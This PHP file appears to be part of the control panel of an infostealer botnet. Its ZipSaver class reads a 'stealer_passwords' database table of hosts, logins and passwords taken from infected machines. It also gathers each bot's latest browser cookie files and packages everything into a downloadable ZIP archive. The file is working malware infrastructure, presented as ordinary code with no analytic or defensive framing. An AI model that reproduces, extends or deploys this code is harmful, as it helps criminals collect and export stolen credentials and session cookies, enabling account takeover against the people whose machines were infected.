<?php

require_once 'Zip.php';

class ZipSaver {
    private $separator;
    private $zip;
    private $botid;
    private $bot_row_id;

    public function __construct()
    {
    }

    public function newZip($useZipFile = false)
    {
        $this->zip = new Zip($useZipFile);
        return $this;
    }

    public function setBotid($botid)
    {
        $this->botid = $botid;
        return $this;
    }

    public function setBotRowId($bot_row_id)
    {
        $this->bot_row_id = $bot_row_id;
        return $this;
    }

    public function downloadPasswords()
    {
        // Passwords
        $rows_lp = null;
        $botids_lp = array();
        if (!empty($this->bot_row_id)) {
            $rows_lp = DBClient::DB()->queryRows('SELECT stealer_passwords.*, bots.botid as botid FROM stealer_passwords,bots WHERE bot_id=:bot_id AND bots.id=bot_id', array(':bot_id' => $this->bot_row_id));
        } else {
            $rows_lp = DBClient::DB()->queryRows('SELECT * FROM stealer_passwords');
        }
        foreach ($rows_lp as $row) {
            $ourtext = '';
            if (!in_array($row['botid'], $botids_lp)) {
                foreach($rows_lp as $str) {
                    if ($str['botid'] == $row['botid']) {
                        $ourtext .= 'Хост: ' . $str['service'] . "\r\n";
                        $ourtext .= 'Логин: ' . $str['login'] . "\r\n";
                        $ourtext .= 'Пароль: ' . $str['password'] . "\r\n";
                        $ourtext .= '===============' . "\r\n";
                    }
                }
                $botids_lp[] = $row['botid'];
                $this->zip->addFile($ourtext, $row['botid'].'/passwords/passwords.txt');
            }
        }
        return $this;
    }

    /*
     * Проходимся по папкам с botid ботов. Заходим внутрь и идем в папку cookies, если он есть.
     * Если папка есть, делаем перебор папок с названиями браузеров. В каждой папке забираем последний созданный репорт.
     */
    public function downloadCookies()
    {
        $handle = opendir(realpath(REPORTS_DIRECTORY));
        if ($handle) {
            // цикл по папкам с botid бота
            while (false !== ($bot_folder = readdir($handle))) {
                if (($bot_folder !== '.') && ($bot_folder !== '..') && !is_file($bot_folder)) {

                    if (!empty($this->botid) && $bot_folder !== $this->botid)
                        continue;

                    $cookies_folder = REPORTS_DIRECTORY . $bot_folder . '/cookies';

                    if (!folder_exist($cookies_folder))
                        continue;

                    // получаем handle папки с куками
                    $cookies_folder_handle = opendir($cookies_folder);

                    // перебираем браузеры
                    while (($browser_folder = readdir($cookies_folder_handle)) !== false) {
                        if (($browser_folder !== '.') && ($browser_folder !== '..') && !is_file($browser_folder)) {

                            $cookie_files = scandir($cookies_folder.'/'.$browser_folder, SCANDIR_SORT_DESCENDING);

                            if (empty($cookie_files))
                                continue;

                            $cookie_file = $cookie_files[0];
                            $this->zip->addLargeFile(
                                $cookies_folder . '/' . $browser_folder . '/' . $cookie_file,
                                $bot_folder.'/cookies/'.$browser_folder.'/'.$cookie_file,
                                filectime($cookies_folder . '/' . $browser_folder . '/' . $cookie_file));
                        }
                    }
                }
            }
        }
        return $this;
    }

    public function sendZip() {
        $zipName = '';
        if (!empty($this->botid)) {
            $zipName .= 'log_' . $this->botid . '_';
        } else {
            $zipName .= 'logs_';
        }
        $zipName .= date('Y-m-d__h-i-s') . '.zip';
        $this->zip->sendZip($zipName);
    }
}